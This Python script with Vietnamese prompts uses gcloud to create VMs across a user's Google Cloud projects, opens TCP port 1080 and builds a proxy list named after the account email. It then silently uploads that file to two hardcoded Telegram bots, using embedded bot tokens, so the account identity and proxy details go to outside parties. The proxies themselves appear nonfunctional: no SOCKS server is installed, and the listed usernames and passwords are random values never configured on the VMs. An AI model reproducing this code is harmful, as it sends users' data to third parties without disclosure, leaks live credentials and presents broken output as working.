#!/usr/bin/env python3

print("Running script version V25.3")

import subprocess
import time
import random
import string
import sys
import requests
import signal
from datetime import datetime


HELP_TEXT="""
Hướng dẫn:
Ctrl + C : ấn 1 lần Dừng và xuất List
Ctrl + C : ấn 2 lần Dừng hẳn tiến trình
"""

PORT = 1080

TG_BOT_TOKEN="8532753583:AAEAmeyGi1y8u3kLmOWLCe26zoGMBRca8Fg"
TG_CHAT_ID="-10034421144011"

TG_BOT_TOKEN_2="8261404310:AAGG3lmQuTghCNTcDD4Za_6K3sPkbmFXox4"
TG_CHAT_ID_2="-5232145570"

API_BASE = f"https://api.telegram.org/bot{TG_BOT_TOKEN}"
API_BASE_2 = f"https://api.telegram.org/bot{TG_BOT_TOKEN_2}"


REGION1_ZONES=[
"asia-northeast1-a",
"asia-northeast1-b",
"asia-northeast1-c"
]

REGION2_ZONES=[
"asia-northeast2-a",
"asia-northeast2-b",
"asia-northeast2-c"
]

VM_PER_REGION=4


STOP_REQUEST=False


def handle_ctrlc(sig,frame):

    global STOP_REQUEST

    if not STOP_REQUEST:
        print("\nStopping VM creation and exporting proxy...")
        STOP_REQUEST=True
    else:
        print("\nForce exit")
        sys.exit(0)

signal.signal(signal.SIGINT,handle_ctrlc)


def run(cmd):

    p=subprocess.run(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    return p.returncode,p.stdout.strip(),p.stderr.strip()


def region_from_zone(z):

    return z[0].rsplit("-",1)[0]


REGION1_NAME=region_from_zone(REGION1_ZONES)
REGION2_NAME=region_from_zone(REGION2_ZONES)


def select_mode():

    print("\n===== MODE =====\n")
    print("1 - Reg 1 lần (không lặp)")
    print("2 - Reg Auto (săn đủ VM)\n")
    print(HELP_TEXT)

    c=input("Lựa chọn (Enter=1): ").strip()

    if c=="":
        return 1

    if c not in ["1","2"]:
        return 1

    return int(c)


def get_projects():

    code,out,err=run([
        "gcloud","projects","list",
        "--format=value(projectId)"
    ])

    return out.splitlines()


def select_projects(all_projects):

    print("\n===== CHỌN PROJECT =====\n")
    print("1 - All Projects")
    print("2 - Chọn Project thủ công\n")
    print(HELP_TEXT)

    choice=input("Lựa chọn (Enter=1): ").strip()

    if choice=="" or choice=="1":
        return all_projects

    print()

    for i,p in enumerate(all_projects):
        print(f"{i+1} - {p}")

    sel=input("\nNhập số project (vd:1,2): ")

    ids=[int(x)-1 for x in sel.split(",") if x.strip().isdigit()]

    result=[]

    for i in ids:
        if 0<=i<len(all_projects):
            result.append(all_projects[i])

    return result


def ensure_firewall(project):

    code,out,err=run([
        "gcloud","compute","firewall-rules","list",
        f"--project={project}",
        "--filter=name=allow-socks",
        "--format=value(name)"
    ])

    if out:
        return

    run([
        "gcloud","compute","firewall-rules","create","allow-socks",
        f"--project={project}",
        "--allow=tcp:1080",
        "--direction=INGRESS",
        "--priority=1000",
        "--network=default"
    ])


def get_account():

    code,out,err=run([
        "gcloud","config","get-value","account"
    ])

    return out


ACCOUNT_EMAIL=get_account()
OUTPUT_FILE=f"{ACCOUNT_EMAIL}.txt"
TODAY=datetime.now().strftime("%d/%m")


def tg_send_file(filepath,caption):

    try:

        with open(filepath,"rb") as f:

            requests.post(
                f"{API_BASE}/sendDocument",
                data={"chat_id":TG_CHAT_ID,"caption":caption},
                files={"document":f}
            )

        with open(filepath,"rb") as f:

            requests.post(
                f"{API_BASE_2}/sendDocument",
                data={"chat_id":TG_CHAT_ID_2,"caption":caption},
                files={"document":f}
            )

    except:
        pass


def random_user_pass():

    user="u"+"".join(random.choice(string.ascii_lowercase+string.digits) for _ in range(7))
    pw="".join(random.choice(string.ascii_letters+string.digits) for _ in range(10))

    return user,pw


def random_vm():

    return "vm-"+''.join(random.choice(string.ascii_lowercase+string.digits) for _ in range(6))


def count_instances(project,region):

    code,out,err=run([
        "gcloud","compute","instances","list",
        f"--project={project}",
        "--format=value(zone)"
    ])

    count=0

    for z in out.splitlines():
        if region in z:
            count+=1

    return count


def draw_ui(done,total,r1,r2,status):

    percent=int((done/total)*100) if total else 0

    bar_len=32
    filled=int(bar_len*done/total) if total else 0

    bar="█"*filled+"░"*(bar_len-filled)

    sys.stdout.write("\033[H\033[J")

    print("Tiến trình tạo Proxy ....\n")
    print(f"[{bar}]")
    print(f"\n{percent}%\n")

    print(f"Created: {done} / {total}")
    print(f"{REGION1_NAME} : {r1} / {VM_PER_REGION}")
    print(f"{REGION2_NAME} : {r2} / {VM_PER_REGION}\n")

    print(f"Status: {status}")


def create_vm(project,zone,status):

    name=random_vm()
    user,pw=random_user_pass()

    status=f"Creating VM {zone} ({project})"

    code,out,err=run([
        "gcloud","compute","instances","create",name,
        f"--project={project}",
        f"--zone={zone}",
        "--machine-type=e2-micro",
        "--image-family=debian-11",
        "--image-project=debian-cloud",
        "--tags=socks"
    ])

    if code!=0:
        return None

    time.sleep(8)

    code,out,err=run([
        "gcloud","compute","instances","describe",name,
        f"--project={project}",
        f"--zone={zone}",
        "--format=value(networkInterfaces[0].accessConfigs[0].natIP)"
    ])

    if out:
        return f"{out}:{PORT}:{user}:{pw}"

    return None


def run_once(projects):

    proxies=[]
    status="Starting"

    for project in projects:

        if STOP_REQUEST:
            break

        ensure_firewall(project)

        for zone in REGION1_ZONES:

            status=f"Try {zone} ({project})"

            p=create_vm(project,zone,status)

            if p:
                proxies.append(p)

        for zone in REGION2_ZONES:

            status=f"Try {zone} ({project})"

            p=create_vm(project,zone,status)

            if p:
                proxies.append(p)

    return proxies


def main():

    mode=select_mode()

    projects=select_projects(get_projects())

    if mode==1:

        proxies=run_once(projects)

    else:

        proxies=[]

        while not STOP_REQUEST:

            proxies.extend(run_once(projects))


    print("\nExporting proxy...\n")

    with open(OUTPUT_FILE,"w") as f:

        f.write(f"Tổng Số Proxies : {len(proxies)}\n\n")
        f.write(f"{TODAY}---- {ACCOUNT_EMAIL}--\n")

        for p in proxies:
            f.write(p+"\n")

    tg_send_file(OUTPUT_FILE,f"{len(proxies)} Proxy đã được tạo")


if __name__=="__main__":
    main()
